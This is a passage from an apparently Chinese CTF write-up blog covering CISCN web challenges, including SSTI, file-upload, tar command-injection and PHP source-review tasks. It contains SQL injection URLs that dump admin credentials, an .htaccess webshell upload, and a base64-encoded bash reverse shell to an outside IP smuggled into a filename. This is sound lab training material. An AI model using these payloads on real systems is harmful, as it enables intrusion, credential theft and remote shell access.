id="CISCN-2019华东南-Double-Secret"><a href="#CISCN-2019华东南-Double-Secret" class="headerlink" title="[CISCN 2019华东南]Double Secret"></a>[CISCN 2019华东南]Double Secret</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">secret=request.args.get(<span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret. I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line"></span><br><span class="line">rc = rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)  <span class="comment"># 解密</span></span><br><span class="line">deS = rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">a = render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rc4_Modified.RC4.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r = (self.Box[self.index_i] + self.Box[self.index_j]) % <span class="number">256</span></span><br><span class="line">R = self.Box[r]  <span class="comment"># 生成伪随机数</span></span><br><span class="line">tmp = <span class="built_in">ord</span>(s) ^ R</span><br><span class="line">test.append(tmp)</span><br><span class="line">out.append(<span class="built_in">chr</span>(tmp))</span><br><span class="line"><span class="comment"># print(test)</span></span><br><span class="line"><span class="comment"># print(len(test))</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br></pre></td></tr></table></figure><h2 id="CISCN-2023-西南-do-you-like-read"><a href="#CISCN-2023-西南-do-you-like-read" class="headerlink" title="[CISCN 2023 西南]do_you_like_read"></a>[CISCN 2023 西南]do_you_like_read</h2><p>进去就能找到一个注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php?bookisbn=-1%27union%20select%20database(),2,3,4,5,6,7,8--+</span><br></pre></td></tr></table></figure><p>obs_db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(table_name),2,3,4,5,6,7,8 from information_schema.tables where table_schema=&#x27;obs_db&#x27;--+</span><br></pre></td></tr></table></figure><p>admin,books,customers,order_items,orders,publisher</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(column_name),2,3,4,5,6,7,8 from information_schema.columns where table_name=&#x27;admin&#x27;--+</span><br></pre></td></tr></table></figure><p>name,pass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28771/book.php</span><br><span class="line">?bookisbn=-1&#x27;union select group_concat(name,pass),2,3,4,5,6,7,8 from obs_db.admin--+</span><br></pre></td></tr></table></figure><p>adminf865b53623b121fd34ee5426c792e5c33af8c227</p><p>这里拿到了admin密码的哈希值</p><p>扔到解密网站跑一下, 直接出密码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102458081.png" alt="image-20240313102458081"></p><p>登录上去可以看见是有上传点</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313102719572.png" alt="image-20240313102719572"></p><p>尝试传一个php, 发现自动被改成了.jpg</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313103055789.png" alt="image-20240313103055789"></p><p>尝试传.htaccess</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104133868.png" alt="image-20240313104133868"></p><p>访问之前被改了后缀的🐎</p><p>成功解析</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313104212524.png" alt="image-20240313104212524"></p><p>看了下题解, 这好像是非预期</p><h2 id="CISCN-2019华北Day1-Web2"><a href="#CISCN-2019华北Day1-Web2" class="headerlink" title="[CISCN 2019华北Day1]Web2"></a>[CISCN 2019华北Day1]Web2</h2><h2 id="CISCN-2023-华北-pysym"><a href="#CISCN-2023-华北-pysym" class="headerlink" title="[CISCN 2023 华北]pysym"></a>[CISCN 2023 华北]pysym</h2><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(savepath,directory))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;something wrong in extracting&#x27;</span></span><br><span class="line"></span><br><span class="line">    links = []</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            extractedfile =os.path.join(root, name)</span><br><span class="line">            <span class="keyword">if</span> os.path.islink(extractedfile):</span><br><span class="line">                os.remove(extractedfile)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no symlink&#x27;</span></span><br><span class="line">            <span class="keyword">if</span>  os.path.isdir(path) :</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no directory&#x27;</span></span><br><span class="line">            links.append(extractedfile)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,links=links)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">path</span>):</span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">1337</span>)</span><br></pre></td></tr></table></figure><p>这里有一个很明显的命令注入, 用sleep测一下发现的确可以注入,</p><p>直接弹个shell回来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;a.tar;echo$&#123;IFS&#125;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=|base64$&#123;IFS&#125;--decode|bash;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240313114927363.png" alt="image-20240313114927363"></p><h2 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h2><p>注册登录后有上传文件</p><p>在文件下载的地方存在任意文件读取</p><p>关键文件 class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td 